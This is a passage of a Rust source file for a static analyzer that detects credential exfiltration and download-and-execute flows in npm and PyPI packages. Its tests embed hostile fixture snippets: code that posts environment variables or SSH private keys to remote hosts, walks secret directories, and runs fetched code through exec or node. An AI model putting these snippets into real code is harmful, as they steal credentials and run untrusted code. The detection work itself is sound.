    while let Some(c) = chars.next() {
        if c == '\n' {
            line += 1;
        }
        if let Some(q) = quote {
            cur.push(if c == '\n' { ' ' } else { c });
            if c == q && prev != '\\' || (c == '\n' && q != '`' && !python) {
                quote = None;
            }
            prev = if prev == '\\' && c == '\\' { '\0' } else { c };
            continue;
        }
        // Comments: `#` in Python, `//` and `/* */` in JS.
        if (python && c == '#') || (!python && c == '/' && chars.peek() == Some(&'/')) {
            for d in chars.by_ref() {
                if d == '\n' {
                    line += 1;
                    if depth <= 0 {
                        flush(&mut cur, &mut out, start, innermost(&scopes));
                        start = line;
                    }
                    break;
                }
            }
            prev = '\n';
            continue;
        }
        if !python && c == '/' && chars.peek() == Some(&'*') {
            let mut last = '\0';
            for d in chars.by_ref() {
                if d == '\n' {
                    line += 1;
                }
                if last == '*' && d == '/' {
                    break;
                }
                last = d;
            }
            continue;
        }
        match c {
            '"' | '\'' | '`' => {
                quote = Some(c);
                cur.push(c);
            }
            '{' if !python && is_block(&cur, depth) => {
                let opened = js_function(&cur).map(|(name, params)| {
                    funcs.push(Func {
                        name,
                        params,
                        parent: innermost(&scopes),
                    });
                    funcs.len() - 1
                });
                flush(&mut cur, &mut out, start, innermost(&scopes));
                if let (Some(_), Some(header)) = (opened, out.last_mut()) {
                    header.is_def = true;
                }
                start = line;
                blocks.push(depth);
                scopes.push(opened);
                depth = 0;
            }
            '}' if depth == 0 => {
                flush(&mut cur, &mut out, start, innermost(&scopes));
                start = line;
                depth = blocks.pop().unwrap_or(0);
                scopes.pop();
            }
            '(' | '[' | '{' => {
                depth += 1;
                cur.push(c);
            }
            ')' | ']' | '}' => {
                if depth > 0 {
                    depth -= 1;
                    cur.push(c);
                } else {
                    flush(&mut cur, &mut out, start, innermost(&scopes));
                    start = line;
                }
            }
            // `promise\n  .then(…)`: a line that starts with `.` goes on.
            '\n' if !python
                && depth <= 0
                && chars.clone().find(|c| !c.is_whitespace()) == Some('.') =>
            {
                cur.push(' ')
            }
            ';' | '\n' if depth <= 0 => {
                flush(&mut cur, &mut out, start, innermost(&scopes));
                start = line;
            }
            '\n' => cur.push(' '),
            _ => cur.push(c),
        }
        if cur.len() > MAX_STMT {
            flush(&mut cur, &mut out, start, innermost(&scopes));
            start = line;
            depth = 0;
        }
        prev = c;
    }
    flush(&mut cur, &mut out, start, innermost(&scopes));
    if python {
        // (indentation of the `def`, its function), innermost last.
        let mut open: Vec<(usize, usize)> = Vec::new();
        for s in &mut out {
            let indent = s.text.len() - s.text.trim_start().len();
            while open.last().is_some_and(|&(i, _)| indent <= i) {
                open.pop();
            }
            s.func = open.last().map(|&(_, f)| f);
            if let Some(c) = PY_DEF.captures(&s.text) {
                funcs.push(Func {
                    name: c[1].to_string(),
                    params: params(&c[2]),
                    parent: s.func,
                });
                s.is_def = true;
                open.push((indent, funcs.len() - 1));
            }
        }
    }
    (out, funcs)
}

/// Name and parameters when the text before a block's `{` is a named
/// function's header.
fn js_function(before: &str) -> Option<(String, Vec<String>)> {
    if let Some(c) = TS_ASYNC.captures(before) {
        let list = if c[3].trim().is_empty() { &c[2] } else { &c[3] };
        return Some((c[1].to_string(), params(list)));
    }
    let c = JS_FUNC.captures(before)?;
    let (name, list) = [(1, 2), (3, 4), (5, 6), (7, 8)]
        .into_iter()
        .find_map(|(n, p)| Some((c.get(n)?.as_str(), c.get(p)?.as_str())))?;
    (!NOT_FUNCTIONS.contains(&name)).then(|| (name.to_string(), params(list)))
}

/// A JS `{` that opens a block (function body, `if`, `try`) rather than an
/// object literal. `depth`: brackets open in the statement; inside them a
/// `{` after `=` is a default value (`function f(a = {}, env = process.env)`),
/// which used to cut the header in two and bind `env` to the environment.
fn is_block(before: &str, depth: i32) -> bool {
    let t = before.trim_end();
    t.is_empty()
        || t.ends_with(')')
        || t.ends_with("=>")
        || ["else", "try", "finally", "do"]
            .iter()
            .any(|k| t.ends_with(k))
        || (depth == 0
            && t.split_whitespace()
                .next()
                .is_some_and(|w| ["class", "function", "async"].contains(&w)))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn names(path: &str, src: &str) -> Vec<String> {
        flows(path, src)
            .into_iter()
            .map(|m| m.matched_pattern)
            .collect()
    }

    #[test]
    fn environment_reaching_a_request_through_a_dict() {
        let src = r#"import os, json, urllib.request
def main():
    env_vars = os.environ
    data = {
        "host": "x",
        "env": dict(env_vars),
    }
    data.update({"kube": None})
    data_json = json.dumps(data).encode('utf-8')
    req = urllib.request.Request("http://198.51.100.23:8090/x", data=data_json)
    with urllib.request.urlopen(req) as response:
        response.read()
"#;
        let found = flows("pkg/__init__.py", src);
        assert_eq!(
            found.len(),
            1,
            "{:?}",
            found.iter().map(|m| &m.context).collect::<Vec<_>>()
        );
        assert_eq!(found[0].matched_pattern, CREDENTIAL_EXFIL);
        assert_eq!(found[0].line_number, 11);
        assert!(
            found[0].context.contains("os.environ (line 3)"),
            "{}",
            found[0].context
        );
    }

    #[test]
    fn downloaded_code_reaching_exec_or_node() {
        let py = "from urllib import request\nreq = request.Request(url)\nwith request.urlopen(req, timeout=10) as resp:\n    exec(resp.read(), mod.__dict__)\n";
        assert_eq!(names("m/__init__.py", py), vec![DOWNLOAD_EXECUTE]);
        let curl = "r = subprocess.run(['curl', '-s', 'https://x.github.io/p.js'], capture_output=True, text=True)\nif r.returncode == 0:\n    subprocess.run(['node', '-e', r.stdout], timeout=30)\n";
        assert_eq!(names("w/__init__.py", curl), vec![DOWNLOAD_EXECUTE]);
        let js = "async function go() {\n  const res = await fetch(u);\n  const code = await res.text();\n  new Function(code)();\n}\n";
        assert_eq!(names("index.js", js), vec![DOWNLOAD_EXECUTE]);
    }

    #[test]
    fn ssh_key_written_to_a_raw_https_request() {
        let js = "const https = require('https');\nconst key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\nconst body = JSON.stringify({ k: key });\nconst req = https.request(opts, () => {});\nreq.write(body);\nreq.end();\n";
        assert_eq!(names("lib/a.js", js), vec![CREDENTIAL_EXFIL]);
    }

    #[test]
    fn a_wrapper_around_the_sink_is_a_sink() {
        // strapi-plugin-hextest (dev): `send(tag, data)` writes `data` to a
        // raw request; the callers hold the secrets. Called before defined.
        let js = "const http = require('http');\nsend('env', JSON.stringify(process.env));\n\
                  function send(tag, data) {\n  const req = http.request({ host: H, path: '/x/' + tag, method: 'POST' }, () => {});\n  req.write(data);\n  req.end();\n}\n";
        let found = flows("postinstall.js", js);
        assert_eq!(
            found.len(),
            1,
            "{:?}",
            found.iter().map(|m| &m.context).collect::<Vec<_>>()
        );
        assert_eq!(
            (found[0].matched_pattern.as_str(), found[0].line_number),
            (CREDENTIAL_EXFIL, 2)
        );
        // Derived values keep the whole: a chunk of a parameter's text.
        let chunks = "const http = require('http');\nfunction send(tag, data) {\n  const body = typeof data === 'string' ? data : JSON.stringify(data);\n  const chunks = [];\n  chunks.push(body.substring(0, 5000));\n  const chunk = chunks[0];\n  const req = http.request({ host: H, method: 'POST' });\n  req.write(chunk);\n  req.end();\n}\nsend('keys', run('cat /root/.ssh/id_rsa'));\n";
        assert_eq!(names("postinstall.js", chunks), vec![CREDENTIAL_EXFIL]);
        // A wrapper around the wrapper, and an arrow function.
        let two = "const post = async (body) => {\n  await fetch(URL, { method: 'POST', body });\n};\n\
                   function report(what) {\n  post(JSON.stringify(what));\n}\nreport(process.env);\n";
        assert_eq!(names("index.js", two), vec![CREDENTIAL_EXFIL]);
        let py = "import os, requests\nclass C:\n    def send(self, data):\n        requests.post(URL, json=data)\n\n    def run(self):\n        self.send(data=dict(os.environ))\n";
        assert_eq!(names("pkg/__init__.py", py), vec![CREDENTIAL_EXFIL]);
    }

    #[test]
    fn compiled_typescript_stealer_through_a_promise_chain() {
        // The shape of prettier-logger (dev): tsc output, a file read by one
        // function and posted by another, joined by `.then`.
        let js = "const m73 = () => __awaiter(void 0, void 0, void 0, function* () {\n    const o75 = path_1.default.join(os_1.default.homedir(), '.ssh', 'id_ed25519');\n    const p76 = yield fs_1.default.promises.readFile(o75, 'utf8');\n    return p76;\n});\n\
                  const n77 = (q78, t81) => __awaiter(void 0, void 0, void 0, function* () {\n    yield fetch(`${u83}/api/validate/project-env`, {\n        method: 'POST',\n        body: JSON.stringify({ operatingSystem: q78, envContent: t81 }),\n    });\n});\n\
                  m73()\n    .then((v83) => __awaiter(void 0, void 0, void 0, function* () {\n    if (v83 !== null) {\n        yield n77(o15.operatingSystem, v83);\n    }\n}))\n    .catch((e) => { });\n";
        assert_eq!(names("dist/logger.js", js), vec![CREDENTIAL_EXFIL]);
        // env-loader-cli (dev): secret directories walked, matches posted.
        let py = "_SCAN_DIRS = [os.path.join(_HOME, d) for d in ['.ssh', '.aws', '.kube']]\ndef report():\n    findings = []\n    for d in _SCAN_DIRS:\n        for root, dirs, files in os.walk(d):\n            for fn in files:\n                fp = os.path.join(root, fn)\n                with open(fp) as f:\n                    content = f.read()\n                findings.append({'value': content[:80]})\n    data = json.dumps({'findings': findings})\n    req = urllib.request.Request(wh, data=data.encode(), method='POST')\n    urllib.request.urlopen(req, timeout=5)\n";
        assert_eq!(names("env_loader/_core.py", py), vec![CREDENTIAL_EXFIL]);
        // A `.env` file is not a source, whoever sends what it holds (dotenv,
        // mcp-serper-search); nor is a public key path built with join.
        let own_key = "for candidate in [Path.cwd() / '.env']:\n    for line in candidate.read_text().splitlines():\n        if line.startswith('SERPER_API_KEY='):\n            api_key = line.split('=', 1)[1]\nresp = session.post(URL, headers={'X-API-KEY': api_key}, json=payload)\n";
        assert!(names("server.py", own_key).is_empty());
        let dotenv = "const envPath = path.resolve(process.cwd(), '.env');\nconst parsed = parse(fs.readFileSync(envPath));\nObject.assign(process.env, parsed);\nfetch(process.env.API_URL + '/health');\n";
        assert!(
            names("lib/main.js", dotenv).is_empty(),
            "{:?}",
            flows("lib/main.js", dotenv)
        );
        let mixed = "cfg = json.loads(urllib.request.urlopen(CONFIG).read())\nwh = cfg.get('webhook')\nkeys = open(os.path.join(home, '.ssh', 'id_rsa')).read()\nreq = urllib.request.Request(wh, data=keys.encode(), method='POST')\nurllib.request.urlopen(req)\n";
        assert_eq!(names("a.py", mixed), vec![CREDENTIAL_EXFIL]);
        let public = "key = open(os.path.join(home, '.ssh', 'id_ed25519.pub')).read()\nrequests.post(api + '/keys', json={'key': key})\n";
        assert!(names("deploy.py", public).is_empty());
    }

    #[test]
    fn a_call_of_a_function_that_returns_a_secret_carries_it() {
        let js = "function collect() {\n  const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\n  return { key };\n}\n\
                  fetch(URL, { method: 'POST', body: JSON.stringify(collect()) });\n";
        assert_eq!(names("lib/a.js", js), vec![CREDENTIAL_EXFIL]);
        // Downloads are not summarised (setuptools' `download_svn(url)`), and
        // what a function returns is followed one level (ansible-core).
        let py = "def stage():\n    r = requests.get(URL)\n    return r.text\n\nexec(stage())\n";
        assert!(names("setup.py", py).is_empty());
        let two = "def docker_environment():\n    env = dict(os.environ)\n    return env\n\ndef podman_hostname():\n    out = raw_command(['podman', 'info'], env=docker_environment())\n    return out.strip()\n\nip = socket.gethostbyname(podman_hostname())\n";
        assert!(
            names("docker_util.py", two).is_empty(),
            "{:?}",
            flows("docker_util.py", two)
        );
    }

    #[test]
    fn wrappers_in_ordinary_code_have_no_flow() {
        // One variable of the environment, a logger, an environment for a
        // child process, and a method of another object with the same name.
        let js = "function post(url, body) {\n  return fetch(url, { method: 'POST', body: JSON.stringify(body) });\n}\n\
                  function log(msg) {\n  console.log(msg);\n}\nfunction env() {\n  return { ...process.env, CI: '1' };\n}\n\
                  post(api, { token: process.env.TOKEN });\nlog(process.env);\nconst child = spawn('npm', ['test'], { env: env() });\n\
                  socket.post(process.env);\nfetch(status);\n";
        assert!(names("a.js", js).is_empty(), "{:?}", flows("a.js", js));
        // opencode-token-usage: the environment handed to a function that
        // reads two variables of it.
        let picks = "async function token(auth, env) {\n  return fetch(URL, { method: 'POST', body: JSON.stringify({ id: env.CLIENT_ID, secret: env['CLIENT_SECRET'] }) });\n}\nconst env = process.env;\nawait token(auth, env);\nawait fetch(API, { headers: { auth: env.TOKEN } });\n";
        assert!(
            names("usage.js", picks).is_empty(),
            "{:?}",
            flows("usage.js", picks)
        );
        let default = "async function load(paths, state = {}, env = process.env) {\n  const r = await fetch(API, { headers: { auth: env.TOKEN } });\n  await post(env);\n}\n";
        assert!(
            names("usage.js", default).is_empty(),
            "{:?}",
            flows("usage.js", default)
        );
        let py = "def send(data):\n    requests.post(URL, json=data)\n\ndef debug(data):\n    print(data)\n\n\
                  send({'user': os.environ.get('USER')})\ndebug(os.environ)\n";
        assert!(names("a.py", py).is_empty(), "{:?}", flows("a.py", py));
    }

    /// Shapes from new npm and PyPI releases the watch flagged (2026-11-20):
    /// the environment read for one setting, through a helper or a copy.
    #[test]
    fn settings_read_from_the_environment_are_not_the_environment() {
        for (path, src) in [
            ("skill-stubs.js", "const env = options.env ?? process.env;\nconst backend = options.backend ?? edgeBackendBase(env);\nconst response = await fetch(`${backend}/${route}`, { method: 'POST' });\n"),
            ("task-hook.mjs", "const res = await fetch(`http://127.0.0.1:${portOf(process.env)}/api/tasks/digest`, { method: 'POST' });\n"),
            ("minimax.js", "const fromEnv = typeof process.env?.MINIMAX_GROUP_ID === 'string' ? process.env.MINIMAX_GROUP_ID.trim() : '';\nconst response = await fetch(endpointFor(base, fromEnv), { method: 'POST' });\n"),
            ("transport.js", "const factoryContext = {\n  env: process.env,\n  cwd,\n};\nreturn fetch(endpointFactory ? endpointFactory(factoryContext) : location, { method: 'POST' });\n"),
            ("proxy_cli.py", "env = read_env(text) if path else dict(os.environ)\nendpoint = endpoint or env.get(base_env) or None\nreq = urllib.request.Request(endpoint, method='POST')\nurllib.request.urlopen(req, timeout=20)\n"),
            ("webhooks.py", "slug = hub_slug(hub_dir, os.environ)\n\n@router.post('/webhooks/' + slug + '/{name}')\nasync def receive(name, request):\n    pass\n"),
            // An update check: a script for another process, a version number.
            ("update.js", "const script = `fetch(${JSON.stringify(REGISTRY_URL)}).then((r) => r.json())`;\nspawn(process.execPath, ['-e', script], { detached: true });\n"),
            ("finish.mjs", "const r = await fetch('https://registry.npmjs.org/x/latest');\nconst version = (await r.json()).version;\nspawnSync('npx', ['-y', `x@${version}`, ...args], { stdio: 'inherit' });\n"),
        ] {
            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src).iter().map(|m| &m.context).collect::<Vec<_>>());
        }
        // A helper of the file that returns what it collected from its
        // argument keeps the value; one that reads a setting does not.
        let collect = "function secrets(env) {\n  const found = [];\n  for (const [name, value] of Object.entries(env)) {\n    if (/KEY|TOKEN/.test(name)) found.push(value);\n  }\n  return found;\n}\nconst values = secrets(process.env);\nfetch(u, { method: 'POST', body: JSON.stringify(values) });\n";
        assert_eq!(names("g.js", collect), vec![CREDENTIAL_EXFIL]);
        // The whole of it, serialised or handed over, still is.
        for (path, src) in [
            ("a.js", "fetch(u, { method: 'POST', body: JSON.stringify(process.env) });\n"),
            ("b.js", "const env = process.env;\nawait axios.post(u, env);\n"),
            ("c.js", "const data = { env: process.env, host };\nfetch(u, { method: 'POST', body: JSON.stringify(data) });\n"),
            ("d.py", "requests.post(u, json=dict(os.environ))\n"),
            ("e.py", "found = {}\nfor name, value in os.environ.items():\n    found[name] = value\nrequests.post(u, json=found)\n"),
        ] {
            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
        }
        let run = "const code = await (await fetch(u)).text();\nspawn('node', ['-e', code]);\n";
        assert_eq!(names("f.js", run), vec![DOWNLOAD_EXECUTE]);
    }

    /// The clean packages the first version flagged (playwright,
    /// vscode-tailwindcss, delta-core, tvsd).
    #[test]
    fn clean_package_shapes_have_no_flow() {
        let ipc = "function start() {\n  const child = fork(server, [], { env: { ...process.env, PORT } });\n  child.send({ type: 'ready' });\n  res.send(body);\n}\n";
        assert!(names("dist/server.js", ipc).is_empty());
        let backward =
            "def run():\n    exec(code)\n\ndef fetch_code():\n    code = requests.get(URL).text\n";
        assert!(names("orchestrator.py", backward).is_empty());
        let scrape = "request = requests.get(search_url, params={'q': q})\nresults = list(eval(str(request.content, 'utf-8-sig')))\n";
        assert!(names("sources/x.py", scrape).is_empty());
        // todo-tree, pm2: running curl / wget is not running what they fetch.
        let fetch_tool = "execSync('curl -sL https://x.example/codicons.css -o codicons.css');\nspawn('wget', [url, '-O', dest]);\n";
        assert!(names("buildCodiconNames.js", fetch_tool).is_empty());
        // ckan-cloud-operator: a curl command line kept in a variable.
        let command = "cmd = f'curl -f -s --header \"PRIVATE-TOKEN: {t}\" https://gitlab.com/api/v4/{u} > {name}'\nsubprocess.check_call(cmd, shell=True)\n";
        assert!(names("gitlab.py", command).is_empty());
        // next: named variables picked out of the environment.
        let picked = "const { NEXT_TRACE_UPLOAD_DEBUG, NEXT_TRACE_UPLOAD_FULL } = process.env;\nawait fetch(url, { body: JSON.stringify({ full: NEXT_TRACE_UPLOAD_FULL }) });\n";
        assert!(names("trace-uploader.js", picked).is_empty());
        // Random packages drawn for ruleset 2026.11.8: a mocked environment
        // (django-cronman), a server started with it (nbclassic), a public
        // key sent to be signed (unskript).
        let mocked = "@mock.patch(\"cronman.utils.os.environ\", {\"X\": \"1\"})\ndef test_x(self):\n    pass\n";
        assert!(names("tests/test_utils.py", mocked).is_empty());
        let server = "env = os.environ.copy()\ninfo['popen'] = Popen(command, cwd=nbdir, env=env)\nrequests.post(urljoin(info['url'], 'api/shutdown'))\n";
        assert!(names("conftest.py", server).is_empty());
        let public = "pub = os.environ.get('HOME') + '/.ssh/id_rsa.pub'\nwith open(pub) as f:\n    key = f.readlines()\nrequests.post(vault_url, json={'public_key': key[0]})\n";
        assert!(names("ssh.py", public).is_empty());
        let private = public.replace("id_rsa.pub", "id_rsa");
        assert_eq!(names("ssh.py", &private), vec![CREDENTIAL_EXFIL]);
    }

    #[test]
    fn ordinary_code_has_no_flow() {
        let py = r#"import os, subprocess, requests, re
env = os.environ.copy()
env["X"] = "1"
subprocess.run(cmd, env=env)
requests.post(url, json={"token": os.environ.get("TOKEN")})
exec(open("version.py").read())
r = requests.get(url)
version = re.compile(r"v(\d+)").match(r.text)
print("send os.environ to the server")  # data = os.environ
"#;
        assert!(
            names("setup.py", py).is_empty(),
            "{:?}",
            flows("setup.py", py)
        );
        let js = "const { spawn } = require('child_process');\nconst child = spawn('npm', ['test'], { env: { ...process.env, CI: '1' } });\nconst text = await (await fetch(u)).text();\nconst m = /x(\\d+)/.exec(text);\nfetch(api, { headers: { auth: process.env.TOKEN } });\n";
        assert!(names("a.js", js).is_empty(), "{:?}", flows("a.js", js));
    }
}
